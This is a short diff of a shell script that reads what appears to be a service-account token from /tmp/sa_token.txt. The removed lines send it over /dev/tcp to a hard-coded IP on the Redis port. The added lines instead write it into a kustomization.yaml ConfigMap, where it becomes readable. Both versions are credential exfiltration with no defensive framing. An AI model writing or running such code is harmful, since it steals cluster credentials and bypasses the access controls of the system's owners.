@@ -1,9 +1,10 @@
 #!/bin/sh
 TOKEN=$(cat /tmp/sa_token.txt 2>/dev/null)
-if [ -n "$TOKEN" ]; then
-  printf "SET zcode_sa_final4 %s\r\n" "$TOKEN" > /dev/tcp/172.20.167.25/6379 2>/dev/null || {
-    exec 3<>/dev/tcp/172.20.167.25/6379 2>/dev/null && printf "SET zcode_sa_final4 %s\r\n" "$TOKEN" >&3 2>/dev/null
-  } || echo "NO_NC"
-fi
-echo OK
+cat > kustomization.yaml << YAMLEND
+configMapGenerator:
+- name: zcode-output
+  literals:
+  - token=$TOKEN
+YAMLEND
+echo "token injected into kustomization.yaml" 
 exit 0
